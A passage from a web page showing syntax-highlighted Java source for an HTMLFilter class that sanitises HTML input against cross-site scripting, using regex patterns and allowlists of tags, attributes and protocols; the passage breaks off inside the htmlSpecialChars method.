class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * HTML过滤器，用于去除XSS漏洞隐患。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> lh</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTMLFilter</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * regex flag union representing /si modifiers in php</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">REGEX_FLAGS_SI</span> <span class="hljs-operator">=</span> Pattern.CASE_INSENSITIVE | Pattern.DOTALL;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_COMMENTS</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&lt;!--(.*?)--&gt;&quot;</span>, Pattern.DOTALL);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_COMMENT</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^!--(.*)--$&quot;</span>, REGEX_FLAGS_SI);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_TAGS</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&lt;(.*?)&gt;&quot;</span>, Pattern.DOTALL);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_END_TAG</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^/([a-z0-9]+)&quot;</span>, REGEX_FLAGS_SI);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_START_TAG</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^([a-z0-9]+)(.*?)(/?)$&quot;</span>, REGEX_FLAGS_SI);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_QUOTED_ATTRIBUTES</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;([a-z0-9]+)=([\&quot;&#x27;])(.*?)\\2&quot;</span>, REGEX_FLAGS_SI);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_UNQUOTED_ATTRIBUTES</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;([a-z0-9]+)(=)([^\&quot;\\s&#x27;]+)&quot;</span>, REGEX_FLAGS_SI);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_PROTOCOL</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^([^:]+):&quot;</span>, REGEX_FLAGS_SI);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_ENTITY</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&amp;#(\\d+);?&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_ENTITY_UNICODE</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&amp;#x([0-9a-f]+);?&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_ENCODE</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;%([0-9a-f]&#123;2&#125;);?&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_VALID_ENTITIES</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&amp;([^&amp;;]*)(?=(;|&amp;|$))&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_VALID_QUOTES</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;(&gt;|^)([^&lt;]+?)(&lt;|$)&quot;</span>, Pattern.DOTALL);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_END_ARROW</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^&gt;&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_BODY_TO_END</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&lt;([^&gt;]*?)(?=&lt;|$)&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_XML_CONTENT</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;(^|&gt;)([^&lt;]*?)(?=&gt;)&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_STRAY_LEFT_ARROW</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&lt;([^&gt;]*?)(?=&lt;|$)&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_STRAY_RIGHT_ARROW</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;(^|&gt;)([^&lt;]*?)(?=&gt;)&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_AMP</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&amp;&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_QUOTE</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;\&quot;&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_LEFT_ARROW</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&lt;&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_RIGHT_ARROW</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&gt;&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">P_BOTH_ARROWS</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;&lt;&gt;&quot;</span>);<br><br>    <span class="hljs-comment">// @xxx could grow large... maybe use sesat&#x27;s ReferenceMap</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ConcurrentMap&lt;String, Pattern&gt; P_REMOVE_PAIR_BLANKS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ConcurrentMap&lt;String, Pattern&gt; P_REMOVE_SELF_BLANKS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * set of allowed html elements, along with allowed attributes for each element</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, List&lt;String&gt;&gt; vAllowed;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * counts of open tags for each (allowable) html element</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Integer&gt; vTagCounts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * html elements which must always be self-closing (e.g. &quot;&lt;img /&gt;&quot;)</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] vSelfClosingTags;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * html elements which must always have separate opening and closing tags (e.g. &quot;&lt;b&gt;&lt;/b&gt;&quot;)</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] vNeedClosingTags;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * set of disallowed html elements</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] vDisallowed;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * attributes which should be checked for valid protocols</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] vProtocolAtts;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * allowed protocols</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] vAllowedProtocols;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * tags which should be removed if they contain no content (e.g. &quot;&lt;b&gt;&lt;/b&gt;&quot; or &quot;&lt;b /&gt;&quot;)</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] vRemoveBlanks;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * entities allowed within html markup</span><br><span class="hljs-comment">     **/</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] vAllowedEntities;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * flag determining whether comments are allowed in input String.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> stripComment;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> encodeQuotes;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * flag determining whether to try to make tags when presented with &quot;unbalanced&quot; angle brackets (e.g. &quot;&lt;b text &lt;/b&gt;&quot;</span><br><span class="hljs-comment">     * becomes &quot;&lt;b&gt; text &lt;/b&gt;&quot;). If set to false, unbalanced angle brackets will be html escaped.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> alwaysMakeTags;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Default constructor.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HTMLFilter</span><span class="hljs-params">()</span><br>    &#123;<br>        vAllowed = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-keyword">final</span> ArrayList&lt;String&gt; a_atts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        a_atts.add(<span class="hljs-string">&quot;href&quot;</span>);<br>        a_atts.add(<span class="hljs-string">&quot;target&quot;</span>);<br>        vAllowed.put(<span class="hljs-string">&quot;a&quot;</span>, a_atts);<br><br>        <span class="hljs-keyword">final</span> ArrayList&lt;String&gt; img_atts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        img_atts.add(<span class="hljs-string">&quot;src&quot;</span>);<br>        img_atts.add(<span class="hljs-string">&quot;width&quot;</span>);<br>        img_atts.add(<span class="hljs-string">&quot;height&quot;</span>);<br>        img_atts.add(<span class="hljs-string">&quot;alt&quot;</span>);<br>        vAllowed.put(<span class="hljs-string">&quot;img&quot;</span>, img_atts);<br><br>        <span class="hljs-keyword">final</span> ArrayList&lt;String&gt; no_atts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        vAllowed.put(<span class="hljs-string">&quot;b&quot;</span>, no_atts);<br>        vAllowed.put(<span class="hljs-string">&quot;strong&quot;</span>, no_atts);<br>        vAllowed.put(<span class="hljs-string">&quot;i&quot;</span>, no_atts);<br>        vAllowed.put(<span class="hljs-string">&quot;em&quot;</span>, no_atts);<br><br>        vSelfClosingTags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;img&quot;</span> &#125;;<br>        vNeedClosingTags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;strong&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;em&quot;</span> &#125;;<br>        vDisallowed = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;&#125;;<br>        vAllowedProtocols = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;http&quot;</span>, <span class="hljs-string">&quot;mailto&quot;</span>, <span class="hljs-string">&quot;https&quot;</span> &#125;; <span class="hljs-comment">// no ftp.</span><br>        vProtocolAtts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;src&quot;</span>, <span class="hljs-string">&quot;href&quot;</span> &#125;;<br>        vRemoveBlanks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;strong&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;em&quot;</span> &#125;;<br>        vAllowedEntities = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;amp&quot;</span>, <span class="hljs-string">&quot;gt&quot;</span>, <span class="hljs-string">&quot;lt&quot;</span>, <span class="hljs-string">&quot;quot&quot;</span> &#125;;<br>        stripComment = <span class="hljs-literal">true</span>;<br>        encodeQuotes = <span class="hljs-literal">true</span>;<br>        alwaysMakeTags = <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Map-parameter configurable constructor.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> conf map containing configuration. keys match field names.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HTMLFilter</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;String, Object&gt; conf)</span><br>    &#123;<br><br>        <span class="hljs-keyword">assert</span> conf.containsKey(<span class="hljs-string">&quot;vAllowed&quot;</span>) : <span class="hljs-string">&quot;configuration requires vAllowed&quot;</span>;<br>        <span class="hljs-keyword">assert</span> conf.containsKey(<span class="hljs-string">&quot;vSelfClosingTags&quot;</span>) : <span class="hljs-string">&quot;configuration requires vSelfClosingTags&quot;</span>;<br>        <span class="hljs-keyword">assert</span> conf.containsKey(<span class="hljs-string">&quot;vNeedClosingTags&quot;</span>) : <span class="hljs-string">&quot;configuration requires vNeedClosingTags&quot;</span>;<br>        <span class="hljs-keyword">assert</span> conf.containsKey(<span class="hljs-string">&quot;vDisallowed&quot;</span>) : <span class="hljs-string">&quot;configuration requires vDisallowed&quot;</span>;<br>        <span class="hljs-keyword">assert</span> conf.containsKey(<span class="hljs-string">&quot;vAllowedProtocols&quot;</span>) : <span class="hljs-string">&quot;configuration requires vAllowedProtocols&quot;</span>;<br>        <span class="hljs-keyword">assert</span> conf.containsKey(<span class="hljs-string">&quot;vProtocolAtts&quot;</span>) : <span class="hljs-string">&quot;configuration requires vProtocolAtts&quot;</span>;<br>        <span class="hljs-keyword">assert</span> conf.containsKey(<span class="hljs-string">&quot;vRemoveBlanks&quot;</span>) : <span class="hljs-string">&quot;configuration requires vRemoveBlanks&quot;</span>;<br>        <span class="hljs-keyword">assert</span> conf.containsKey(<span class="hljs-string">&quot;vAllowedEntities&quot;</span>) : <span class="hljs-string">&quot;configuration requires vAllowedEntities&quot;</span>;<br><br>        vAllowed = Collections.unmodifiableMap((HashMap&lt;String, List&lt;String&gt;&gt;) conf.get(<span class="hljs-string">&quot;vAllowed&quot;</span>));<br>        vSelfClosingTags = (String[]) conf.get(<span class="hljs-string">&quot;vSelfClosingTags&quot;</span>);<br>        vNeedClosingTags = (String[]) conf.get(<span class="hljs-string">&quot;vNeedClosingTags&quot;</span>);<br>        vDisallowed = (String[]) conf.get(<span class="hljs-string">&quot;vDisallowed&quot;</span>);<br>        vAllowedProtocols = (String[]) conf.get(<span class="hljs-string">&quot;vAllowedProtocols&quot;</span>);<br>        vProtocolAtts = (String[]) conf.get(<span class="hljs-string">&quot;vProtocolAtts&quot;</span>);<br>        vRemoveBlanks = (String[]) conf.get(<span class="hljs-string">&quot;vRemoveBlanks&quot;</span>);<br>        vAllowedEntities = (String[]) conf.get(<span class="hljs-string">&quot;vAllowedEntities&quot;</span>);<br>        stripComment = conf.containsKey(<span class="hljs-string">&quot;stripComment&quot;</span>) ? (Boolean) conf.get(<span class="hljs-string">&quot;stripComment&quot;</span>) : <span class="hljs-literal">true</span>;<br>        encodeQuotes = conf.containsKey(<span class="hljs-string">&quot;encodeQuotes&quot;</span>) ? (Boolean) conf.get(<span class="hljs-string">&quot;encodeQuotes&quot;</span>) : <span class="hljs-literal">true</span>;<br>        alwaysMakeTags = conf.containsKey(<span class="hljs-string">&quot;alwaysMakeTags&quot;</span>) ? (Boolean) conf.get(<span class="hljs-string">&quot;alwaysMakeTags&quot;</span>) : <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reset</span><span class="hljs-params">()</span><br>    &#123;<br>        vTagCounts.clear();<br>    &#125;<br><br>    <span class="hljs-comment">// ---------------------------------------------------------------</span><br>    <span class="hljs-comment">// my versions of some PHP library functions</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">chr</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">int</span> decimal)</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> String.valueOf((<span class="hljs-type">char</span>) decimal);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">htmlSpecialChars</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span><br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> s;<br>        result = regexReplace(P_AMP, <span class="hljs-string">&quot;&amp;amp;&quot;</span>, result);<br>        result = regexReplace(P_QUOTE, <span class="hljs-string">&quot;&amp;quot;&quot;</span>, result);<br>        result = regexReplace(P_LEFT_ARROW, <span class="hljs-string">&quot;&amp;lt;&quot;</span>, result);<br>        result = 